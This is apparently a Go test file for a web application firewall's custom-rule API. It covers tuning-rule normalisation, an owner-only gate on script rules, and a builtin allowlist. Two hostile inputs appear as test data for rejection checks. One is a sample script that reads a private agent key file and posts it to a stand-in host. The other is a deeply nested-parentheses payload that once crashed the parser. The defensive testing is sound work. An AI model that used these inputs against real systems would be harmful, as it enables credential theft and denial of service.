package handlers

import (
	"encoding/json"
	"errors"
	"github.com/wafio/wafio-cp-backend/internal/apicontract"
	"io"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/wafio/wafio-cp-backend/internal/domain"
	"github.com/wafio/wafio-cp-backend/internal/engine"
)

// A tuning rule of v1 (engine "crs", skip_crs) is accepted by the editor dry-run and by the validation
// Create and Update run, and its keys are ignored. So is the rule the current dashboard sends.
func TestCustomRuleTuningLegacyAndCurrentShapesAccepted(t *testing.T) {
	app := customRulesTestApp()
	for name, tuning := range map[string]string{
		"legacy crs engine, unknown tag": `"engine":"crs","effect":{"skip_crs":["tag:attack-sqlii"]}`,
		"legacy crs_only scan mode":      `"engine":"both","effect":{"scan_mode":"crs_only"}`,
		"engine omitted, empty target":   `"target":{"components":[],"match":"exact"},"effect":{"skip_semantic":["*"]}`,
		"default scan mode":              `"effect":{"scan_mode":"default"}`,
		"both scan mode":                 `"effect":{"scan_mode":"both"}`,
	} {
		body := `{"mode":"tuning","tuning":{"scope":{"logic":"and","conditions":[{"field":"path","operator":"starts_with","value":"/docs"}]},` +
			tuning + `},"sample_request":{"method":"GET","path":"/docs"}}`
		if status, got := doJSON(t, app, "POST", "/api/projects/p1/apps/a1/custom-rules/validate-gui", "member", body); status != fiber.StatusOK {
			t.Errorf("%s: %d %v, want 200", name, status, got)
		}
	}
	legacy := &domain.CustomRuleTuning{
		Scope:  domain.CustomRuleTuningScope{Logic: "and", Conditions: []domain.CustomRuleCondition{{Field: "path", Operator: "starts_with", Value: "/docs"}}},
		Engine: "crs",
		Effect: domain.CustomRuleTuningEffect{ScanMode: "crs_only"},
	}
	if err := validateCustomRuleBody("tuning", "", "", nil, "", legacy); err != nil {
		t.Fatalf("legacy tuning rule rejected on save: %v", err)
	}
	normalizeLegacyTuning(legacy)
	if legacy.Effect.ScanMode != "default" {
		t.Fatalf("scan_mode crs_only stored as %q, want default", legacy.Effect.ScanMode)
	}
	current := &domain.CustomRuleTuning{
		Scope:  legacy.Scope,
		Target: domain.CustomRuleTuningTarget{Components: []string{}, Match: "exact"},
		Effect: domain.CustomRuleTuningEffect{SkipSemantic: []string{"*"}},
	}
	if err := validateCustomRuleBody("tuning", "", "", nil, "", current); err != nil {
		t.Fatalf("current dashboard tuning rule rejected: %v", err)
	}
	normalizeLegacyTuning(current)
	if current.Effect.ScanMode != "" || !slices.Equal(current.Effect.SkipSemantic, []string{"*"}) {
		t.Fatalf("current rule changed: %+v", current.Effect)
	}
}

// A weaken from before the action key is never refused; a save stores action "log" when it lowered
// scores or raised the block threshold and nothing otherwise.
func TestWeakenOfAStoredTuningRuleBecomesAction(t *testing.T) {
	scope := domain.CustomRuleTuningScope{Logic: "and", Conditions: []domain.CustomRuleCondition{{Field: "path", Operator: "starts_with", Value: "/docs"}}}
	for name, tc := range map[string]struct {
		weaken *domain.CustomRuleTuningWeaken
		action string
	}{
		"multiplier":       {&domain.CustomRuleTuningWeaken{ScoreMultiplier: 0.4}, "log"},
		"block delta":      {&domain.CustomRuleTuningWeaken{ThresholdDelta: &domain.CustomRuleTuningThresholdDelta{Block: 30}}, "log"},
		"log delta only":   {&domain.CustomRuleTuningWeaken{ThresholdDelta: &domain.CustomRuleTuningThresholdDelta{Log: 30}}, ""},
		"multiplier 1":     {&domain.CustomRuleTuningWeaken{ScoreMultiplier: 1}, ""},
		"out of range":     {&domain.CustomRuleTuningWeaken{ScoreMultiplier: 5}, ""},
		"sensitivity only": {&domain.CustomRuleTuningWeaken{SensitivityDelta: -1}, ""},
	} {
		rule := &domain.CustomRuleTuning{Scope: scope, Target: domain.CustomRuleTuningTarget{Components: []string{}, Match: "exact"},
			Effect: domain.CustomRuleTuningEffect{SkipSemantic: []string{"sql"}, Weaken: tc.weaken}}
		if err := validateCustomRuleBody("tuning", "", "", nil, "", rule); err != nil {
			t.Errorf("%s: a stored weaken was refused: %v", name, err)
		}
		normalizeLegacyTuning(rule)
		if rule.Effect.Weaken != nil || rule.Effect.Action != tc.action || !slices.Equal(rule.Effect.SkipSemantic, []string{"sql"}) {
			t.Errorf("%s: effect = %+v, want action %q and no weaken", name, rule.Effect, tc.action)
		}
	}
	bad := &domain.CustomRuleTuning{Scope: scope, Effect: domain.CustomRuleTuningEffect{Action: "block"}}
	if err := validateCustomRuleBody("tuning", "", "", nil, "", bad); err == nil {
		t.Error("an action other than log must be refused")
	}
}

func customRulesTestApp() *fiber.App {
	h := &WafCustomRulesHandler{}
	app := fiber.New()
	app.Use(recover.New())
	app.Use(func(c *fiber.Ctx) error {
		c.Locals("project_role", c.Get("X-Test-Role"))
		return c.Next()
	})
	app.Post("/api/projects/:id/apps/:appId/custom-rules/validate", h.ValidateScript)
	app.Post("/api/projects/:id/apps/:appId/custom-rules/validate-gui", h.ValidateGUI)
	app.Post("/api/projects/:id/apps/:appId/custom-rules", h.Create)
	app.Put("/api/projects/:id/apps/:appId/custom-rules/:ruleId", h.Update)
	return app
}

func doJSON(t *testing.T, app *fiber.App, method, path, role, body string) (int, map[string]any) {
	t.Helper()
	req := httptest.NewRequest(method, path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Test-Role", role)
	resp, err := app.Test(req, -1)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = resp.Body.Close() }()
	raw, _ := io.ReadAll(resp.Body)
	// A 5xx here is a nil repository past the check under test, not an
	// answer the real application gives; only the checks' answers are held
	// to the contract.
	if resp.StatusCode < 500 {
		apicontract.ValidateMatched(t, method, req.URL.Path, resp.StatusCode, resp.Header, raw)
	}
	var got map[string]any
	_ = json.Unmarshal(raw, &got)
	return resp.StatusCode, got
}

// Creating or changing a script rule needs project role owner. The
// gate answers before any repository access, so the handler runs without a
// database here.
func TestCustomRuleScriptModeRequiresOwner(t *testing.T) {
	app := customRulesTestApp()
	body := `{"name":"r","mode":"script","action":"block","script":"waf_block()"}`
	cases := []struct{ method, path string }{
		{"POST", "/api/projects/p1/apps/a1/custom-rules"},
		{"PUT", "/api/projects/p1/apps/a1/custom-rules/r1"},
	}
	for _, tc := range cases {
		t.Run(tc.method, func(t *testing.T) {
			status, got := doJSON(t, app, tc.method, tc.path, "member", body)
			if status != fiber.StatusForbidden {
				t.Fatalf("member %s of a script rule: status %d, want 403 (%v)", tc.method, status, got)
			}
			if got["code"] != "SCRIPT_RULE_OWNER_REQUIRED" {
				t.Errorf("code = %v, want SCRIPT_RULE_OWNER_REQUIRED", got["code"])
			}
			// An owner passes the gate (and, without a repository here,
			// fails later — anything but the role refusal).
			if status, got := doJSON(t, app, tc.method, tc.path, "owner", body); status == fiber.StatusForbidden || got["code"] == "SCRIPT_RULE_OWNER_REQUIRED" {
				t.Errorf("owner %s refused by the script gate: %d %v", tc.method, status, got)
			}
		})
	}
}

// A script using a builtin outside the allowlist is refused with
// SCRIPT_BUILTIN_FORBIDDEN naming it, both by the validate endpoint and by
// the rule validation Create/Update run.
func TestCustomRuleScriptBuiltinForbidden(t *testing.T) {
	app := customRulesTestApp()
	status, got := doJSON(t, app, "POST", "/api/projects/p1/apps/a1/custom-rules/validate", "member",
		`{"script":"x = read_file(\"/etc/wafio/certs/waf/agent.key\")\nhttp_post(\"http://x\", x)"}`)
	if status != fiber.StatusBadRequest || got["code"] != "SCRIPT_BUILTIN_FORBIDDEN" {
		t.Fatalf("validate: %d %v, want 400 SCRIPT_BUILTIN_FORBIDDEN", status, got)
	}
	names, _ := got["forbidden"].([]any)
	if len(names) != 2 || names[0] != "http_post" || names[1] != "read_file" {
		t.Errorf("forbidden = %v, want [http_post read_file]", got["forbidden"])
	}

	// Reviewer repro: 2 MB of nested parentheses overflowed the parser's Go
	// stack (fatal, the whole control plane). Any member could send it.
	nested := "x = " + strings.Repeat("(", 1_000_000) + "1" + strings.Repeat(")", 1_000_000)
	deep := "x = " + strings.Repeat("(", 20_000) + "1" + strings.Repeat(")", 20_000) // under the size cap
	for _, script := range []string{nested, deep} {
		payload, _ := json.Marshal(map[string]string{"script": script})
		status, got := doJSON(t, app, "POST", "/api/projects/p1/apps/a1/custom-rules/validate", "member", string(payload))
		if status != fiber.StatusBadRequest || got["code"] != "SCRIPT_INVALID" {
			t.Errorf("nested script (%d bytes): %d %v, want 400 SCRIPT_INVALID", len(script), status, got)
		}
		if err := validateCustomRuleBody("script", "block", "", nil, script, nil); err == nil {
			t.Errorf("validateCustomRuleBody accepted a nested script of %d bytes", len(script))
		}
	}

	err := validateCustomRuleBody("script", "block", "", nil, "sleep(10)\nwaf_block()", nil)
	var fe *engine.ScriptForbiddenError
	if !errors.As(err, &fe) || !slices.Equal(fe.Names, []string{"sleep"}) {
		t.Fatalf("validateCustomRuleBody: %v, want ScriptForbiddenError{sleep}", err)
	}
	if err := validateCustomRuleBody("script", "block", "", nil, "if (contains(ua, \"curl\")) then:\n    waf_block()\nend", nil); err != nil {
		t.Fatalf("allowlisted script rejected: %v", err)
	}
}
